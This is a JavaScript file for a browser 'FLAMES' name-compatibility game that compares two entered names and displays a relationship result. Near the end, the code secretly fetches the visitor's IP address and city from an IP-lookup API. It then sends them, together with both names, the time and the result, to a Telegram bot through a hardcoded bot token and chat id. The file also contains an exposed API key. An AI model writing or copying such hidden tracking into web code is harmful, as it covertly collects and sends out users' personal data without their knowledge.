function run() {
let firstName = document.getElementById('fname').value;
let secondName = document.getElementById('sname').value;
if(firstName == "" || secondName == ""){
  alert(" -- Please enter all the NIBBA or NIBBI details -- ")
}
else{
 firstName = firstName.toLowerCase();
 secondName = secondName.toLowerCase();
let firstArray = firstName.split("");
let secondArray = secondName.split("");
//console.log(firstArray,secondArray);
let length1 = firstArray.length;
let length2 = secondArray.length;
let set1 = [1,17];
let set2 = [2,4,7,9,20];
let set3 = [3,5,14,16,18];
let set4 = [6,11,15];
let set5 = [8,12,13,19];
let set6 = [10];
let count = length1 + length2; 
for (z=0;z<=length1;z++){
  if(firstArray[z]==" "){
    firstArray.splice(z,1,'3');
    length1--;
    count--;
  }
}
for(y=0;y<=length2;y++){
  if(secondArray[y]==" "){
    secondArray.splice(y,1,'4');
    length2--;
    count--;
  }
}
for(i=0 ; i<length1 ; i++ ){
  for(j=0 ; j<length2 ; j++ ) {
    if(firstArray[i] === secondArray[j]){
    count = count - 2;
   firstArray.splice(i,1 , '1');
  secondArray.splice(j,1 , '2');
    }
    }
  }
   console.log(firstArray , secondArray);
console.log(count);
let result = count;
var final;
for (l=0;l<2;l++){
  if(result === set1[l]){
  document.getElementById('check').innerHTML="Siblings";
  var final = "Siblings";
}
}
for (l=0;l<5;l++){
  if(result === set2[l]){
  document.getElementById('check').innerHTML="Enemy";
  var final = "Enemy";
}
}
for (l=0;l<5;l++){
  if(result === set3[l]){
 document.getElementById('check').innerHTML="Friends";
  var final = "Friends";
}
}
for (l=0;l<3;l++){
  if(result === set4[l]){
  document.getElementById('check').innerHTML="Marraige";
  var final = "Marriage";
}
}
for (l=0;l<4;l++){
  if(result === set5[l]){
 document.getElementById('check').innerHTML="Arranged Marraige";
  var final = "Arranged Marriage";
}
}
for (l=0;l<1;l++){
  if(result === set6[l]){
  document.getElementById('check').innerHTML="Lover";
  var final = "Lover";
}
}
fname.value = '';
sname.value = '';


function json(url) {
  return fetch(url).then(res => res.json());
}
let data1= "";
let city1 = "";
let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
  let data1 = data.ip;
  let city1 = data.city;
  console.log(data1);
  console.log(data.threat.is_proxy);


var token ="1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M";

var chat_id = -1001717443651;

var time = new Date();

var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + " with IP - " + data1 +' has checked flames on your website with names  '+firstName +"   "+secondName + "  at  "+time + " and their result was  " +final;

let api = new XMLHttpRequest();

 api.open("GET", url, true);

 api.send();
console.log(url); 

  });

}
}
